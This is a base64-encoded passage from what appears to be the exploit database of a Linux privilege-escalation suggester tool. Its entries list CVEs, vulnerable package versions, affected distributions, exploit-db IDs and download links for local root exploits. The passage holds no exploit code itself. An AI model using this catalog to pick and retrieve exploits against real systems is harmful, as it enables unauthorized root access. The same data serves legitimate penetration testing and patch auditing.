TmFtZTogJHt0eHRncm59W0NWRS0yMDA5LTExODVdJHt0eHRyc3R9IHVkZXYgMgpSZXFzOiBwa2c9dWRldix2ZXI8MTQxClRhZ3M6ClJhbms6IDEKZXhwbG9pdC1kYjogODQ3OApDb21tZW50czogU1NIIGFjY2VzcyB0byBub24gcHJpdmlsZWdlZCB1c2VyIGlzIG5lZWRlZC4gVmVyc2lvbjwxLjQuMSB2dWxuZXJhYmxlIGJ1dCBkaXN0cm9zIHVzZSBvd24gdmVyc2lvbmluZyBzY2hlbWUuIE1hbnVhbCB2ZXJpZmljYXRpb24gbmVlZGVkCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDEwLTA4MzJdJHt0eHRyc3R9IFBBTSBNT1REClJlcXM6IHBrZz1saWJwYW0tbW9kdWxlcyx2ZXI8PTEuMS4xClRhZ3M6IHVidW50dT05LjEwfDEwLjA0ClJhbms6IDEKZXhwbG9pdC1kYjogMTQzMzkKQ29tbWVudHM6IFNTSCBhY2Nlc3MgdG8gbm9uIHByaXZpbGVnZWQgdXNlciBpcyBuZWVkZWQKRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTAtNDE3MF0ke3R4dHJzdH0gU3lzdGVtVGFwClJlcXM6IHBrZz1zeXN0ZW10YXAsdmVyPD0xLjMKVGFnczogUkhFTD01e3N5c3RlbXRhcDoxLjEtMy5lbDV9LGZlZG9yYT0xM3tzeXN0ZW10YXA6MS4yLTEuZmMxM30KUmFuazogMQphdXRob3I6IFRhdmlzIE9ybWFuZHkKZXhwbG9pdC1kYjogMTU2MjAKRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTEtMTQ4NV0ke3R4dHJzdH0gcGtleGVjClJlcXM6IHBrZz1wb2xraXQsdmVyPTAuOTYKVGFnczogUkhFTD02LHVidW50dT0xMC4wNHwxMC4xMApSYW5rOiAxCmV4cGxvaXQtZGI6IDE3OTQyCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDExLTI5MjFdJHt0eHRyc3R9IGt0c3VzcwpSZXFzOiBwa2c9a3RzdXNzLHZlcjw9MS40ClRhZ3M6IHNwYXJreT01fDYKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vd3d3Lm9wZW53YWxsLmNvbS9saXN0cy9vc3Mtc2VjdXJpdHkvMjAxMS8wOC8xMy8yCnNyYy11cmw6IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9iY29sZXMvbG9jYWwtZXhwbG9pdHMvbWFzdGVyL0NWRS0yMDExLTI5MjEva3RzdXNzLWxwZS5zaApFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxMi0wODA5XSR7dHh0cnN0fSBkZWF0aF9zdGFyIChzdWRvKQpSZXFzOiBwa2c9c3Vkbyx2ZXI+PTEuOC4wLHZlcjw9MS44LjMKVGFnczogZmVkb3JhPTE2IApSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cDovL3NlY2xpc3RzLm9yZy9mdWxsZGlzY2xvc3VyZS8yMDEyL0phbi9hdHQtNTkwL2Fkdmlzb3J5X3N1ZG8udHh0CmV4cGxvaXQtZGI6IDE4NDM2CkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE0LTA0NzZdJHt0eHRyc3R9IGNoa3Jvb3RraXQKUmVxczogcGtnPWNoa3Jvb3RraXQsdmVyPDAuNTAKVGFnczogClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vc2VjbGlzdHMub3JnL29zcy1zZWMvMjAxNC9xMi80MzAKZXhwbG9pdC1kYjogMzM4OTkKQ29tbWVudHM6IFJvb3RpbmcgZGVwZW5kcyBvbiB0aGUgY3JvbnRhYiAodXAgdG8gb25lIGRheSBvZiBkZWxheSkKRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTQtNTExOV0ke3R4dHJzdH0gX19nY29udl90cmFuc2xpdF9maW5kClJlcXM6IHBrZz1nbGliY3xsaWJjNix4ODYKVGFnczogZGViaWFuPTYKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHA6Ly9nb29nbGVwcm9qZWN0emVyby5ibG9nc3BvdC5jb20vMjAxNC8wOC90aGUtcG9pc29uZWQtbnVsLWJ5dGUtMjAxNC1lZGl0aW9uLmh0bWwKc3JjLXVybDogaHR0cHM6Ly9naXRodWIuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0LWRhdGFiYXNlLWJpbi1zcGxvaXRzL3Jhdy9tYXN0ZXIvYmluLXNwbG9pdHMvMzQ0MjEudGFyLmd6CmV4cGxvaXQtZGI6IDM0NDIxCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE1LTE4NjJdJHt0eHRyc3R9IG5ld3BpZCAoYWJydCkKUmVxczogcGtnPWFicnQsY21kOmdyZXAgLXFpIGFicnQgL3Byb2Mvc3lzL2tlcm5lbC9jb3JlX3BhdHRlcm4KVGFnczogZmVkb3JhPTIwClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vb3BlbndhbGwuY29tL2xpc3RzL29zcy1zZWN1cml0eS8yMDE1LzA0LzE0LzQKc3JjLXVybDogaHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS90YXZpc28vMGYwMmMyNTVjMTNjNWMxMTM0MDYvcmF3L2VhZmFjNzhkY2U1MTMyOWIwM2JlYTcxNjdmMTI3MTcxOGJlZTRkY2MvbmV3cGlkLmMKZXhwbG9pdC1kYjogMzY3NDYKRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTUtMzMxNV0ke3R4dHJzdH0gcmFjZWFicnQKUmVxczogcGtnPWFicnQsY21kOmdyZXAgLXFpIGFicnQgL3Byb2Mvc3lzL2tlcm5lbC9jb3JlX3BhdHRlcm4KVGFnczogZmVkb3JhPTE5e2FicnQ6Mi4xLjUtMS5mYzE5fSxmZWRvcmE9MjB7YWJydDoyLjIuMi0yLmZjMjB9LGZlZG9yYT0yMXthYnJ0OjIuMy4wLTMuZmMyMX0sUkhFTD03e2FicnQ6Mi4xLjExLTEyLmVsN30KUmFuazogMQphbmFseXNpcy11cmw6IGh0dHA6Ly9zZWNsaXN0cy5vcmcvb3NzLXNlYy8yMDE1L3EyLzEzMApzcmMtdXJsOiBodHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Rhdmlzby9mZTM1OTAwNjgzNmQ2Y2QxMDkxZS9yYXcvMzJmZTg0ODFjNDM0ZjhjYWQ1YmNmODUyOTc4OTIzMTYyN2U1MDc0Yy9yYWNlYWJydC5jCmV4cGxvaXQtZGI6IDM2NzQ3CmF1dGhvcjogVGF2aXMgT3JtYW5keQpFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNS0xMzE4XSR7dHh0cnN0fSBuZXdwaWQgKGFwcG9ydCkKUmVxczogcGtnPWFwcG9ydCx2ZXI+PTIuMTMsdmVyPD0yLjE3LGNtZDpncmVwIC1xaSBhcHBvcnQgL3Byb2Mvc3lzL2tlcm5lbC9jb3JlX3BhdHRlcm4KVGFnczogdWJ1bnR1PTE0LjA0ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vb3BlbndhbGwuY29tL2xpc3RzL29zcy1zZWN1cml0eS8yMDE1LzA0LzE0LzQKc3JjLXVybDogaHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS90YXZpc28vMGYwMmMyNTVjMTNjNWMxMTM0MDYvcmF3L2VhZmFjNzhkY2U1MTMyOWIwM2JlYTcxNjdmMTI3MTcxOGJlZTRkY2MvbmV3cGlkLmMKZXhwbG9pdC1kYjogMzY3NDYKRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTUtMTMxOF0ke3R4dHJzdH0gbmV3cGlkIChhcHBvcnQpIDIKUmVxczogcGtnPWFwcG9ydCx2ZXI+PTIuMTMsdmVyPD0yLjE3LGNtZDpncmVwIC1xaSBhcHBvcnQgL3Byb2Mvc3lzL2tlcm5lbC9jb3JlX3BhdHRlcm4KVGFnczogdWJ1bnR1PTE0LjA0LjIKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHA6Ly9vcGVud2FsbC5jb20vbGlzdHMvb3NzLXNlY3VyaXR5LzIwMTUvMDQvMTQvNApleHBsb2l0LWRiOiAzNjc4MgpFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNS0zMjAyXSR7dHh0cnN0fSBmdXNlIChmdXNlcm1vdW50KQpSZXFzOiBwa2c9ZnVzZSx2ZXI8Mi45LjMKVGFnczogZGViaWFuPTcuMHw4LjAsdWJ1bnR1PSoKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHA6Ly9zZWNsaXN0cy5vcmcvb3NzLXNlYy8yMDE1L3EyLzUyMApleHBsb2l0LWRiOiAzNzA4OQpDb21tZW50czogTmVlZHMgY3JvbiBvciBzeXN0ZW0gYWRtaW4gaW50ZXJhY3Rpb24KRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTUtMTgxNV0ke3R4dHJzdH0gc2V0cm91Ymxlc2hvb3QKUmVxczogcGtnPXNldHJvdWJsZXNob290LHZlcjwzLjIuMjIKVGFnczogZmVkb3JhPTIxClJhbms6IDEKZXhwbG9pdC1kYjogMzY1NjQKRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTUtMzI0Nl0ke3R4dHJzdH0gdXNlcmhlbHBlcgpSZXFzOiBwa2c9bGlidXNlcix2ZXI8PTAuNjAKVGFnczogUkhFTD02e2xpYnVzZXI6MC41Ni4xMy0oNHw1KS5lbDZ9LFJIRUw9NntsaWJ1c2VyOjAuNjAtNS5lbDd9LGZlZG9yYT0xM3wxOXwyMHwyMXwyMgpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly93d3cucXVhbHlzLmNvbS8yMDE1LzA3LzIzL2N2ZS0yMDE1LTMyNDUtY3ZlLTIwMTUtMzI0Ni9jdmUtMjAxNS0zMjQ1LWN2ZS0yMDE1LTMyNDYudHh0IApleHBsb2l0LWRiOiAzNzcwNgpDb21tZW50czogUkhFTCA1IGlzIGFsc28gdnVsbmVyYWJsZSwgYnV0IGluc3RhbGxlZCB2ZXJzaW9uIG9mIGdsaWJjICgyLjUpIGxhY2tzIGZ1bmN0aW9ucyBuZWVkZWQgYnkgcm9vdGhlbHBlci5jCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE1LTUyODddJHt0eHRyc3R9IGFicnQvc29zcmVwb3J0LXJoZWw3ClJlcXM6IHBrZz1hYnJ0LGNtZDpncmVwIC1xaSBhYnJ0IC9wcm9jL3N5cy9rZXJuZWwvY29yZV9wYXR0ZXJuClRhZ3M6IFJIRUw9N3thYnJ0OjIuMS4xMS0xMi5lbDd9ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL3d3dy5vcGVud2FsbC5jb20vbGlzdHMvb3NzLXNlY3VyaXR5LzIwMTUvMTIvMDEvMQpzcmMtdXJsOiBodHRwczovL3d3dy5vcGVud2FsbC5jb20vbGlzdHMvb3NzLXNlY3VyaXR5LzIwMTUvMTIvMDEvMS8xCmV4cGxvaXQtZGI6IDM4ODMyCmF1dGhvcjogcmViZWwKRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTUtNjU2NV0ke3R4dHJzdH0gbm90X2FuX3NzaG51a2UKUmVxczogcGtnPW9wZW5zc2gtc2VydmVyLHZlcj49Ni44LHZlcjw9Ni45ClRhZ3M6ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vd3d3Lm9wZW53YWxsLmNvbS9saXN0cy9vc3Mtc2VjdXJpdHkvMjAxNy8wMS8yNi8yCmV4cGxvaXQtZGI6IDQxMTczCmF1dGhvcjogRmVkZXJpY28gQmVudG8KQ29tbWVudHM6IE5lZWRzIGFkbWluIGludGVyYWN0aW9uIChyb290IHVzZXIgbmVlZHMgdG8gbG9naW4gdmlhIHNzaCB0byB0cmlnZ2VyIGV4cGxvaXRhdGlvbikKRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTUtODYxMl0ke3R4dHJzdH0gYmx1ZW1hbiBzZXRfZGhjcF9oYW5kbGVyIGQtYnVzIHByaXZlc2MKUmVxczogcGtnPWJsdWVtYW4sdmVyPDIuMC4zClRhZ3M6IGRlYmlhbj04e2JsdWVtYW46MS4yM30KUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vdHdpdHRlci5jb20vdGhlZ3J1Z3Evc3RhdHVzLzY3NzgwOTUyNzg4MjgxMzQ0MApleHBsb2l0LWRiOiA0NjE4NgphdXRob3I6IFNlYmFzdGlhbiBLcmFobWVyCkNvbW1lbnRzOiBEaXN0cm9zIHVzZSBvd24gdmVyc2lvbmluZyBzY2hlbWUuIE1hbnVhbCB2ZXJpZmljYXRpb24gbmVlZGVkLgpFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNi0xMjQwXSR7dHh0cnN0fSB0b21jYXQtcm9vdHByaXZlc2MtZGViLnNoClJlcXM6IHBrZz10b21jYXQKVGFnczogZGViaWFuPTgsdWJ1bnR1PTE2LjA0ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL2xlZ2FsaGFja2Vycy5jb20vYWR2aXNvcmllcy9Ub21jYXQtRGViUGtncy1Sb290LVByaXZpbGVnZS1Fc2NhbGF0aW9uLUV4cGxvaXQtQ1ZFLTIwMTYtMTI0MC5odG1sCnNyYy11cmw6IGh0dHA6Ly9sZWdhbGhhY2tlcnMuY29tL2V4cGxvaXRzL3RvbWNhdC1yb290cHJpdmVzYy1kZWIuc2gKZXhwbG9pdC1kYjogNDA0NTAKYXV0aG9yOiBEYXdpZCBHb2x1bnNraQpDb21tZW50czogQWZmZWN0cyBvbmx5IERlYmlhbi1iYXNlZCBkaXN0cm9zCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE2LTEyNDddJHt0eHRyc3R9IG5naW54ZWQtcm9vdC5zaApSZXFzOiBwa2c9bmdpbnh8bmdpbngtZnVsbCx2ZXI8MS4xMC4zClRhZ3M6IGRlYmlhbj04LHVidW50dT0xNC4wNHwxNi4wNHwxNi4xMApSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tL2Fkdmlzb3JpZXMvTmdpbngtRXhwbG9pdC1EZWItUm9vdC1Qcml2RXNjLUNWRS0yMDE2LTEyNDcuaHRtbApzcmMtdXJsOiBodHRwczovL2xlZ2FsaGFja2Vycy5jb20vZXhwbG9pdHMvQ1ZFLTIwMTYtMTI0Ny9uZ2lueGVkLXJvb3Quc2gKZXhwbG9pdC1kYjogNDA3NjgKYXV0aG9yOiBEYXdpZCBHb2x1bnNraQpDb21tZW50czogUm9vdGluZyBkZXBlbmRzIG9uIGNyb24uZGFpbHkgKHVwIHRvIDI0aCBvZiBkZWxheSkuIEFmZmVjdGVkOiBkZWI4OiA8MS42LjI7IDE0LjA0OiA8MS40LjY7IDE2LjA0OiAxLjEwLjA7IGdlbnRvbzogPDEuMTAuMi1yMwpFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNi0xNTMxXSR7dHh0cnN0fSBwZXJsX3N0YXJ0dXAgKGV4aW0pClJlcXM6IHBrZz1leGltLHZlcjw0Ljg2LjIKVGFnczogClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vd3d3LmV4aW0ub3JnL3N0YXRpYy9kb2MvQ1ZFLTIwMTYtMTUzMS50eHQKZXhwbG9pdC1kYjogMzk1NDkKRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTYtMTUzMV0ke3R4dHJzdH0gcGVybF9zdGFydHVwIChleGltKSAyClJlcXM6IHBrZz1leGltLHZlcjw0Ljg2LjIKVGFnczogClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vd3d3LmV4aW0ub3JnL3N0YXRpYy9kb2MvQ1ZFLTIwMTYtMTUzMS50eHQKZXhwbG9pdC1kYjogMzk1MzUKRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTYtNDk4OV0ke3R4dHJzdH0gc2V0cm91Ymxlc2hvb3QgMgpSZXFzOiBwa2c9c2V0cm91Ymxlc2hvb3QKVGFnczogUkhFTD02fDcKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vYy1za2lsbHMuYmxvZ3Nwb3QuY29tLzIwMTYvMDYvbGV0cy1mZWVkLWF0dGFja2VyLWlucHV0LXRvLXNoLWMtdG8tc2VlLmh0bWwKc3JjLXVybDogaHR0cHM6Ly9naXRodWIuY29tL3N0ZWFsdGgvdHJvdWJsZXNob290ZXIvcmF3L21hc3Rlci9zdHJhaWdodC1zaG9vdGVyLmMKZXhwbG9pdC1kYjoKRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTYtNTQyNV0ke3R4dHJzdH0gdG9tY2F0LVJILXJvb3Quc2gKUmVxczogcGtnPXRvbWNhdApUYWdzOiBSSEVMPTcKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHA6Ly9sZWdhbGhhY2tlcnMuY29tL2Fkdmlzb3JpZXMvVG9tY2F0LVJlZEhhdC1Qa2dzLVJvb3QtUHJpdkVzYy1FeHBsb2l0LUNWRS0yMDE2LTU0MjUuaHRtbApzcmMtdXJsOiBodHRwOi8vbGVnYWxoYWNrZXJzLmNvbS9leHBsb2l0cy90b21jYXQtUkgtcm9vdC5zaApleHBsb2l0LWRiOiA0MDQ4OAphdXRob3I6IERhd2lkIEdvbHVuc2tpCkNvbW1lbnRzOiBBZmZlY3RzIG9ubHkgUmVkSGF0LWJhc2VkIGRpc3Ryb3MKRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTYtNjY2MyxDVkUtMjAxNi02NjY0fENWRS0yMDE2LTY2NjJdJHt0eHRyc3R9IG15c3FsLWV4cGxvaXQtY2hhaW4KUmVxczogcGtnPW15c3FsLXNlcnZlcnxtYXJpYWRiLXNlcnZlcix2ZXI8NS41LjUyClRhZ3M6IHVidW50dT0xNi4wNC4xClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL2xlZ2FsaGFja2Vycy5jb20vYWR2aXNvcmllcy9NeVNRTC1NYXJpYS1QZXJjb25hLVByaXZFc2NSYWNlLUNWRS0yMDE2LTY2NjMtNTYxNi1FeHBsb2l0Lmh0bWwKc3JjLXVybDogaHR0cDovL2xlZ2FsaGFja2Vycy5jb20vZXhwbG9pdHMvQ1ZFLTIwMTYtNjY2My9teXNxbC1wcml2ZXNjLXJhY2UuYwpleHBsb2l0LWRiOiA0MDY3OAphdXRob3I6IERhd2lkIEdvbHVuc2tpCkNvbW1lbnRzOiBBbHNvIE1hcmlhREIgdmVyPDEwLjEuMTggYW5kIHZlcjwxMC4wLjI4IGFmZmVjdGVkCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE2LTk1NjZdJHt0eHRyc3R9IG5hZ2lvcy1yb290LXByaXZlc2MKUmVxczogcGtnPW5hZ2lvcyx2ZXI8NC4yLjQKVGFnczoKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vbGVnYWxoYWNrZXJzLmNvbS9hZHZpc29yaWVzL05hZ2lvcy1FeHBsb2l0LVJvb3QtUHJpdkVzYy1DVkUtMjAxNi05NTY2Lmh0bWwKc3JjLXVybDogaHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tL2V4cGxvaXRzL0NWRS0yMDE2LTk1NjYvbmFnaW9zLXJvb3QtcHJpdmVzYy5zaApleHBsb2l0LWRiOiA0MDkyMQphdXRob3I6IERhd2lkIEdvbHVuc2tpCkNvbW1lbnRzOiBBbGxvd3MgcHJpdiBlc2NhbGF0aW9uIGZyb20gbmFnaW9zIHVzZXIgb3IgbmFnaW9zIGdyb3VwCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE3LTAzNThdJHt0eHRyc3R9IG50ZnMtM2ctbW9kcHJvYmUKUmVxczogcGtnPW50ZnMtM2csdmVyPDIwMTcuNApUYWdzOiB1YnVudHU9MTYuMDR7bnRmcy0zZzoyMDE1LjMuMTRBUi4xLTFidWlsZDF9LGRlYmlhbj03LjB7bnRmcy0zZzoyMDEyLjEuMTVBUi41LTIuMStkZWI3dTJ9LGRlYmlhbj04LjB7bnRmcy0zZzoyMDE0LjIuMTVBUi4yLTErZGViOHUyfQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9idWdzLmNocm9taXVtLm9yZy9wL3Byb2plY3QtemVyby9pc3N1ZXMvZGV0YWlsP2lkPTEwNzIKc3JjLXVybDogaHR0cHM6Ly9naXRodWIuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0LWRhdGFiYXNlLWJpbi1zcGxvaXRzL3Jhdy9tYXN0ZXIvYmluLXNwbG9pdHMvNDEzNTYuemlwCmV4cGxvaXQtZGI6IDQxMzU2CmF1dGhvcjogSmFubiBIb3JuCkNvbW1lbnRzOiBEaXN0cm9zIHVzZSBvd24gdmVyc2lvbmluZyBzY2hlbWUuIE1hbnVhbCB2ZXJpZmljYXRpb24gbmVlZGVkLiBMaW51eCBoZWFkZXJzIG11c3QgYmUgaW5zdGFsbGVkLiBTeXN0ZW0gbXVzdCBoYXZlIGF0IGxlYXN0IHR3byBDUFUgY29yZXMuCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE3LTU4OTldJHt0eHRyc3R9IHMtbmFpbC1wcml2Z2V0ClJlcXM6IHBrZz1zLW5haWwsdmVyPDE0LjguMTYKVGFnczogdWJ1bnR1PTE2LjA0LG1hbmphcm89MTYuMTAKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vd3d3Lm9wZW53YWxsLmNvbS9saXN0cy9vc3Mtc2VjdXJpdHkvMjAxNy8wMS8yNy83CnNyYy11cmw6IGh0dHBzOi8vd3d3Lm9wZW53YWxsLmNvbS9saXN0cy9vc3Mtc2VjdXJpdHkvMjAxNy8wMS8yNy83LzEKZXh0LXVybDogaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jjb2xlcy9sb2NhbC1leHBsb2l0cy9tYXN0ZXIvQ1ZFLTIwMTctNTg5OS9leHBsb2l0LnNoCmF1dGhvcjogd2FwaWZsYXBpIChvcmdpbmFsIGV4cGxvaXQgYXV0aG9yKTsgQnJlbmRhbiBDb2xlcyAoYXV0aG9yIG9mIGV4cGxvaXQgdXBkYXRlIGF0ICdleHQtdXJsJykKQ29tbWVudHM6IERpc3Ryb3MgdXNlIG93biB2ZXJzaW9uaW5nIHNjaGVtZS4gTWFudWFsIHZlcmlmaWNhdGlvbiBuZWVkZWQuCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE3LTEwMDAzNjddJHt0eHRyc3R9IFN1ZG9lci10by1yb290ClJlcXM6IHBrZz1zdWRvLHZlcjw9MS44LjIwLGNtZDpbIC1mIC91c3Ivc2Jpbi9nZXRlbmZvcmNlIF0KVGFnczogUkhFTD03e3N1ZG86MS44LjZwN30KUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vd3d3LnN1ZG8ud3MvYWxlcnRzL2xpbnV4X3R0eS5odG1sCnNyYy11cmw6IGh0dHBzOi8vd3d3LnF1YWx5cy5jb20vMjAxNy8wNS8zMC9jdmUtMjAxNy0xMDAwMzY3L2xpbnV4X3N1ZG9fY3ZlLTIwMTctMTAwMDM2Ny5jCmV4cGxvaXQtZGI6IDQyMTgzCmF1dGhvcjogUXVhbHlzCkNvbW1lbnRzOiBOZWVkcyB0byBiZSBzdWRvZXIuIFdvcmtzIG9ubHkgb24gU0VMaW51eCBlbmFibGVkIHN5c3RlbXMKRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTctMTAwMDM2N10ke3R4dHJzdH0gc3Vkb3B3bgpSZXFzOiBwa2c9c3Vkbyx2ZXI8PTEuOC4yMCxjbWQ6WyAtZiAvdXNyL3NiaW4vZ2V0ZW5mb3JjZSBdClRhZ3M6ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL3d3dy5zdWRvLndzL2FsZXJ0cy9saW51eF90dHkuaHRtbApzcmMtdXJsOiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYzBkM3ozcjAvc3Vkby1DVkUtMjAxNy0xMDAwMzY3L21hc3Rlci9zdWRvcHduLmMKZXhwbG9pdC1kYjoKYXV0aG9yOiBjMGQzejNyMApDb21tZW50czogTmVlZHMgdG8gYmUgc3Vkb2VyLiBXb3JrcyBvbmx5IG9uIFNFTGludXggZW5hYmxlZCBzeXN0ZW1zCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE3LTEwMDAzNjYsQ1ZFLTIwMTctMTAwMDM3MF0ke3R4dHJzdH0gbGludXhfbGRzb19od2NhcApSZXFzOiBwa2c9Z2xpYmN8bGliYzYsdmVyPD0yLjI1LHg4NgpUYWdzOgpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly93d3cucXVhbHlzLmNvbS8yMDE3LzA2LzE5L3N0YWNrLWNsYXNoL3N0YWNrLWNsYXNoLnR4dApzcmMtdXJsOiBodHRwczovL3d3dy5xdWFseXMuY29tLzIwMTcvMDYvMTkvc3RhY2stY2xhc2gvbGludXhfbGRzb19od2NhcC5jCmV4cGxvaXQtZGI6IDQyMjc0CmF1dGhvcjogUXVhbHlzCkNvbW1lbnRzOiBVc2VzICJTdGFjayBDbGFzaCIgdGVjaG5pcXVlLCB3b3JrcyBhZ2FpbnN0IG1vc3QgU1VJRC1yb290IGJpbmFyaWVzCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE3LTEwMDAzNjYsQ1ZFLTIwMTctMTAwMDM3MV0ke3R4dHJzdH0gbGludXhfbGRzb19keW5hbWljClJlcXM6IHBrZz1nbGliY3xsaWJjNix2ZXI8PTIuMjUseDg2ClRhZ3M6IGRlYmlhbj05fDEwLHVidW50dT0xNC4wNC41fDE2LjA0LjJ8MTcuMDQsZmVkb3JhPTIzfDI0fDI1ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL3d3dy5xdWFseXMuY29tLzIwMTcvMDYvMTkvc3RhY2st